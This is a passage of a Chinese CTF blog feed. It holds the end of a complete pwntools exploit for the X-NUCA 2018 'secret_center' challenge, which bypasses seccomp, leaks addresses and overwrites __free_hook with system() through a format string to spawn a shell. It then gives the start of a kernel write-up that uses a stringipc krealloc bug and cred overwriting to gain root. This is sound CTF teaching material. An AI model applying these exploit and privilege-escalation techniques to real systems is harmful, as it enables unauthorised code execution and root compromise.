class="string">'./secret_center'</span>)</span><br><span class="line">libc_name = <span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span></span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./secret_center'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="comment">#p = remote('106.75.73.20', 8999)#process('./pwn1')</span></span><br><span class="line">p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">10006</span>)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span></span><br><span class="line"><span class="string"> 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010</span></span><br><span class="line"><span class="string"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span></span><br><span class="line"><span class="string"> 0003: 0x15 0x06 0x00 0x00000003  if (A == close) goto 0010</span></span><br><span class="line"><span class="string"> 0004: 0x15 0x05 0x00 0x000000e7  if (A == exit_group) goto 0010</span></span><br><span class="line"><span class="string"> 0005: 0x15 0x00 0x03 0x00000002  if (A != open) goto 0009</span></span><br><span class="line"><span class="string"> 0006: 0x20 0x00 0x00 0x00000010  A = args[0]</span></span><br><span class="line"><span class="string"> 0007: 0x54 0x00 0x00 0x000000ff  A &amp;= 0xff</span></span><br><span class="line"><span class="string"> 0008: 0x15 0x01 0x00 0x0000007c  if (A == 124) goto 0010</span></span><br><span class="line"><span class="string"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span></span><br><span class="line"><span class="string"> 0010: 0x06 0x00 0x00 0x00050001  return ERRNO(1)</span></span><br><span class="line"><span class="string"> 0011: 0x06 0x00 0x00 0x00050001  return ERRNO(1)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">(a=<span class="string">''</span>)</span>:</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">gdb.attach(p,a)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guard_ready</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_guard</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'5'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'6'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'size: '</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">'Content: \n'</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">input</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Secret Size: '</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">'Content: \n'</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"><span class="comment">#sleep(0.1)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rule</span><span class="params">(code,jt ,jf ,k)</span>:</span></span><br><span class="line"><span class="keyword">return</span> p16(code) + p8(jt) + p8(jf) + p32(k) </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_rule</span><span class="params">()</span>:</span></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload+= rule(<span class="number">0x20</span> ,<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00000004</span>) <span class="comment">#  A = arch</span></span><br><span class="line">payload+= rule(<span class="number">0x15</span> ,<span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0xc000003e</span>) <span class="comment">#  if (A != ARCH_X86_64) goto 0010</span></span><br><span class="line">payload+= rule(<span class="number">0x20</span> ,<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00000000</span>) <span class="comment">#  A = sys_number</span></span><br><span class="line">payload+= rule(<span class="number">0x15</span> ,<span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00000003</span>) <span class="comment">#  if (A == close) goto 0010</span></span><br><span class="line">payload+= rule(<span class="number">0x15</span> ,<span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x000000e7</span>) <span class="comment">#  if (A == exit_group) goto 0010</span></span><br><span class="line">payload+= rule(<span class="number">0x15</span> ,<span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00000002</span>) <span class="comment">#  if (A != open) goto 0009</span></span><br><span class="line">payload+= rule(<span class="number">0x20</span> ,<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00000010</span>) <span class="comment">#  A = args[0]</span></span><br><span class="line">payload+= rule(<span class="number">0x54</span> ,<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x000000ff</span>) <span class="comment">#  A &amp;= 0xff</span></span><br><span class="line">payload+= rule(<span class="number">0x15</span> ,<span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x0000007c</span>) <span class="comment">#  if (A == 124) goto 0010</span></span><br><span class="line">payload+= rule(<span class="number">0x06</span> ,<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7fff0000</span>) <span class="comment">#  return ALLOW</span></span><br><span class="line">payload+= rule(<span class="number">0x06</span> ,<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00050000</span>) <span class="comment">#  return ERRNO(2)</span></span><br><span class="line"><span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">input(<span class="number">0xF0</span> ,<span class="string">'p4nda'</span>) <span class="comment">#1</span></span><br><span class="line">delete()<span class="comment">#2</span></span><br><span class="line">guard_ready()<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">rule_data = build_rule()<span class="comment">#4</span></span><br><span class="line">edit(len(rule_data),rule_data)<span class="comment">#5</span></span><br><span class="line">set_guard()<span class="comment">#6</span></span><br><span class="line"><span class="comment">#z('b fopen\nb __fprintf_chk\nc')</span></span><br><span class="line"></span><br><span class="line">fmt = (<span class="string">"%256p"</span>*<span class="number">0x19</span>+<span class="string">'%n'</span>).ljust(<span class="number">0xa0</span>,<span class="string">'a'</span>)</span><br><span class="line">input(<span class="number">0x120</span>,fmt+<span class="string">'\x10'</span>)<span class="comment">#7</span></span><br><span class="line">p.recvuntil(<span class="string">"Not Good Secret :P\n\n"</span>)</span><br><span class="line">maps = <span class="string">'000000000000-7fffffffffff r-xp 00000000 00:00 0 /bin/p4nda'</span></span><br><span class="line">p.sendline(maps)</span><br><span class="line">input(<span class="number">0x68</span>,<span class="string">'\x00'</span>)<span class="comment">#8</span></span><br><span class="line">libc_address = <span class="number">0</span></span><br><span class="line">heap_address = <span class="number">0</span></span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">tmp = p.readline()</span><br><span class="line"><span class="keyword">if</span> <span class="string">"close"</span> <span class="keyword">in</span> tmp:</span><br><span class="line">tmp+= p.readline()</span><br><span class="line">tmp.replace(<span class="string">"It's close.. Try to get a shell!\n"</span>,<span class="string">''</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[?]'</span>,tmp<span class="comment">#.split('-')[0]</span></span><br><span class="line"><span class="keyword">if</span> (<span class="string">'libc-2.23.so'</span> <span class="keyword">in</span> tmp):</span><br><span class="line">addr = int(<span class="string">'0x'</span>+tmp.split(<span class="string">'-'</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">if</span> libc_address == <span class="number">0</span>:</span><br><span class="line">libc_address = addr</span><br><span class="line"><span class="keyword">if</span> <span class="string">'heap'</span> <span class="keyword">in</span> tmp:</span><br><span class="line">addr = int(<span class="string">'0x'</span>+tmp.split(<span class="string">'-'</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">if</span> heap_address == <span class="number">0</span>:</span><br><span class="line">heap_address = addr</span><br><span class="line"><span class="keyword">if</span> <span class="string">'secret_center'</span> <span class="keyword">in</span> tmp:</span><br><span class="line">addr = int(<span class="string">'0x'</span>+tmp.split(<span class="string">'-'</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">if</span> pie == <span class="number">0</span>:</span><br><span class="line">pie = addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (libc_address*heap_address*pie != <span class="number">0</span>):</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]libc_address'</span>,hex(libc_address)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]heap_address'</span>,hex(heap_address)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]pie'</span>,hex(pie)</span><br><span class="line">now = <span class="number">0</span></span><br><span class="line">last= <span class="number">0</span></span><br><span class="line">fmt = (<span class="string">'%256p'</span>*<span class="number">33</span>)</span><br><span class="line">target = libc_address+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">where  = libc_address+libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">now = (target&gt;&gt;(i*<span class="number">8</span>))&amp;<span class="number">0xff</span></span><br><span class="line"><span class="keyword">if</span> last&lt;now:</span><br><span class="line">fmt+= <span class="string">'%'</span>+str(now-last)+<span class="string">'c'</span> + <span class="string">'%hhn'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">fmt+= <span class="string">'%'</span>+str(<span class="number">0x100</span>+now-last)+<span class="string">'c'</span>+ <span class="string">'%hhn'</span></span><br><span class="line">last =  now</span><br><span class="line"></span><br><span class="line">fmt+=<span class="string">';sh'</span></span><br><span class="line">fmt = fmt.ljust(<span class="number">0xe0</span>,<span class="string">'\0'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">fmt+= p64(<span class="number">0x31</span>)+p64(where+i)</span><br><span class="line">input(<span class="number">0x150</span>,fmt+<span class="string">'\0'</span>)<span class="comment">#9</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'fmt:'</span>,hex(len(fmt)),fmt</span><br><span class="line">p.recvuntil(<span class="string">'It\'s close.. Try to get a shell!'</span>)</span><br><span class="line">p.sendline(maps)</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>总之，题目考察了很多东西，还是很有意思的一道题目，感谢AFang师傅的帮助。</p>]]></content>
    
    <summary type="html">
    
      此题是X-NUCA&#39;2018的一道题目，在比赛过程中没有队伍解出。赛后在得到AFang师傅的提示后复现成功。
    
    </summary>
    
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>【KERNEL PWN】从内存任意读写到权限提升</title>
    <link href="http://p4nda.top/2018/11/07/stringipc/"/>
    <id>http://p4nda.top/2018/11/07/stringipc/</id>
    <published>2018-11-07T08:30:19.000Z</published>
    <updated>2018-11-13T11:21:11.526Z</updated>
    
    <content type="html"><![CDATA[<p>本篇主要以CSAW-2015-CTF的stringipc题目为例，分析了三种从内存任意读写到权限提升的利用方法。本人学习KERNEL PWN的时间也较短，如有差错，请指正。</p><p>本文的先知社区链接：<a href="https://xz.aliyun.com/t/3204" target="_blank" rel="noopener">https://xz.aliyun.com/t/3204</a></p><h1 id="0-环境搭建与题目分析"><a href="#0-环境搭建与题目分析" class="headerlink" title="0 环境搭建与题目分析"></a>0 环境搭建与题目分析</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>题目环境由于比赛时间过去很久了，没有找到，所以选择自行编译。</p><p>内核源码我选择了<a href="https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.4.110.tar.gz" target="_blank" rel="noopener">linux-4.4.110版本</a>。<br>busybox采用<a href="https://busybox.net/downloads/busybox-1.21.1.tar.bz2" target="_blank" rel="noopener">1.21.1版本</a>。<br>stringipc的题目源码可以在<a href="https://github.com/mncoppola/StringIPC/blob/master/main.c" target="_blank" rel="noopener">这里</a>找到。<br>源码及busybox编译可以参考<a href="https://www.anquanke.com/post/id/85837" target="_blank" rel="noopener">这篇文章</a>进行编译，我就不赘述了。</p><p>将stringipc的源码，放在内核源码目录下，并编写Makefile文件，执行make就可以编译成为符合内核源码的驱动文件string.ko。<br>相关环境及题目文件可在<a href="https://github.com/ret2p4nda/kernel-pwn" target="_blank" rel="noopener">此处</a>下载</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目主要维护了一块由kzalloc(sizeof(*channel), GFP_KERNEL)创建的内存块，并可对内存块读、写、扩展或缩小。<br>此题漏洞存在于对漏洞扩展的函数realloc_ipc_channel中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">realloc_ipc_channel</span> <span class="params">( struct ipc_state *state, <span class="keyword">int</span> id, <span class="keyword">size_t</span> size, <span class="keyword">int</span> grow )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_channel</span> *<span class="title">channel</span>;</span></span><br><span class="line">    <span class="keyword">size_t</span> new_size;</span><br><span class="line">    <span class="keyword">char</span> *new_data;</span><br><span class="line"></span><br><span class="line">    channel = get_channel_by_id(state, id);</span><br><span class="line">    <span class="keyword">if</span> ( IS_ERR(channel) )</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(channel);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( grow )</span><br><span class="line">        new_size = channel-&gt;buf_size + size;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        new_size = channel-&gt;buf_size - size;</span><br><span class="line"></span><br><span class="line">    new_data = krealloc(channel-&gt;data, new_size + <span class="number">1</span>, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> ( new_data == <span class="literal">NULL</span> )</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    channel-&gt;data = new_data;</span><br><span class="line">    channel-&gt;buf_size = new_size;</span><br><span class="line"></span><br><span class="line">    ipc_channel_put(state, channel);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当krealloc返回值不为0时，可以通过验证，将返回值作为内存块起始地址。而krealloc(mm\slab_common.c 1225)在实现中有一个不为0的错误代码ZERO_SIZE_PTR</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * krealloc - reallocate memory. The contents will remain unchanged.</span></span><br><span class="line"><span class="comment"> * @p: object to reallocate memory for.</span></span><br><span class="line"><span class="comment"> * @new_size: how many bytes of memory are required.</span></span><br><span class="line"><span class="comment"> * @flags: the type of memory to allocate.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The contents of the object pointed to are preserved up to the</span></span><br><span class="line"><span class="comment"> * lesser of the new and old sizes.  If @p is %NULL, krealloc()</span></span><br><span class="line"><span class="comment"> * behaves exactly like kmalloc().  If @new_size is 0 and @p is not a</span></span><br><span class="line"><span class="comment"> * %NULL pointer, the object pointed to is freed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">krealloc</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *p, <span class="keyword">size_t</span> new_size, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!new_size)) &#123;</span><br><span class="line">kfree(p);</span><br><span class="line"><span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret = __do_krealloc(p, new_size, flags);</span><br><span class="line"><span class="keyword">if</span> (ret &amp;&amp; p != ret)</span><br><span class="line">kfree(p);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(krealloc);</span><br></pre></td></tr></table></figure><p>而ZERO_SIZE_PTR定义在include\linux\slab.h 101</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ZERO_SIZE_PTR ((void *)16)</span></span><br></pre></td></tr></table></figure><p>可知，当new_size = 0时，可返回该值，而构造该值时由于并没有对传入的size进行检查，恰好new_size = 0 - 1 ，即为0xffffffffffffffff，而此后的检测所定义的size值均为size_t 即unsize long long。所以通过题目中给出的seek、read、write功能就可以对内核及用户态地址任意读写。</p><h1 id="1-修改cred结构提升权限"><a href="#1-修改cred结构提升权限" class="headerlink" title="1 修改cred结构提升权限"></a>1 修改cred结构提升权限</h1><h2 id="cred结构体"><a href="#cred结构体" class="headerlink" title="cred结构体"></a>cred结构体</h2><p>提及cred结构，做过权限提升的同学都不会陌生。这个结构体是用来标注某线程权限的结构体。</p><p>首先，每一个线程在内核中都对应一个线程栈、一个线程结构块thread_info去调度，结构体里面同时也包含了线程的一系列信息。</p><p>该thread_info结构体存放在线程栈的最低地址，对应的结构体定义(\arch\x86\include\asm\thread_info.h 55)是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span>*<span class="title">task</span>;</span><span class="comment">/* main task structure */</span></span><br><span class="line">__u32flags;<span class="comment">/* low level flags */</span></span><br><span class="line">__u32status;<span class="comment">/* thread synchronous flags */</span></span><br><span class="line">__u32cpu;<span class="comment">/* current CPU */</span></span><br><span class="line"><span class="keyword">mm_segment_t</span>addr_limit;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>sig_on_uaccess_error:<span class="number">1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>uaccess_err:<span class="number">1</span>;<span class="comment">/* uaccess failed */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>而在thread_info里，包含最重要信息的是task_struct结构体，定义在(\include\linux\sched.h 1390)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">裁剪过后 </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line"><span class="keyword">volatile</span> <span class="keyword">long</span> state;<span class="comment">/* -1 unrunnable, 0 runnable, &gt;0 stopped */</span></span><br><span class="line"><span class="keyword">void</span> *<span class="built_in">stack</span>;</span><br><span class="line"><span class="keyword">atomic_t</span> usage;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> flags;<span class="comment">/* per process flags, defined below */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> ptrace;</span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line"><span class="comment">/* process credentials */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">ptracer_cred</span>;</span> <span class="comment">/* Tracer's credentials at attach */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">real_cred</span>;</span> <span class="comment">/* objective and real subjective task</span></span><br><span class="line"><span class="comment"> * credentials (COW) */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">cred</span>;</span><span class="comment">/* effective (overridable) subjective task</span></span><br><span class="line"><span class="comment"> * credentials (COW) */</span></span><br><span class="line"><span class="keyword">char</span> comm[TASK_COMM_LEN]; <span class="comment">/* executable name excluding path</span></span><br><span class="line"><span class="comment">     - access with [gs]et_task_comm (which lock</span></span><br><span class="line"><span class="comment">       it with task_lock())</span></span><br><span class="line"><span class="comment">     - initialized normally by setup_new_exec */</span></span><br><span class="line"><span class="comment">/* file system info */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nameidata</span> *<span class="title">nameidata</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSVIPC</span></span><br><span class="line"><span class="comment">/* ipc stuff */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sysv_sem</span> <span class="title">sysvsem</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sysv_shm</span> <span class="title">sysvshm</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">... ... </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>而其中，cred结构体(\include\linux\cred.h 118)表示的就是这个线程的权限。只要将这个结构的uid~fsgid全部覆写为0就可以把这个线程权限提升为root（root uid为0）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line"><span class="keyword">atomic_t</span>usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line"><span class="keyword">atomic_t</span>subscribers;<span class="comment">/* number of processes subscribed */</span></span><br><span class="line"><span class="keyword">void</span>*put_addr;</span><br><span class="line"><span class="keyword">unsigned</span>magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">kuid_t</span>uid;<span class="comment">/* real UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>gid;<span class="comment">/* real GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>suid;<span class="comment">/* saved UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>sgid;<span class="comment">/* saved GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>euid;<span class="comment">/* effective UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>egid;<span class="comment">/* effective GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>fsuid;<span class="comment">/* UID for VFS ops */</span></span><br><span class="line"><span class="keyword">kgid_t</span>fsgid;<span class="comment">/* GID for VFS ops */</span></span><br><span class="line"><span class="keyword">unsigned</span>securebits;<span class="comment">/* SUID-less security management */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_permitted;<span class="comment">/* caps we're permitted */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_effective;<span class="comment">/* caps we can actually use */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_bset;<span class="comment">/* capability bounding set */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_ambient;<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>jit_keyring;<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment"> * keys to */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">void</span>*security;<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span><span class="comment">/* real user ID subscription */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span><span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span><span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个结构体在线程初始化由prepare_creds函数创建，可以看到创建cred的方法是kmem_cache_alloc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 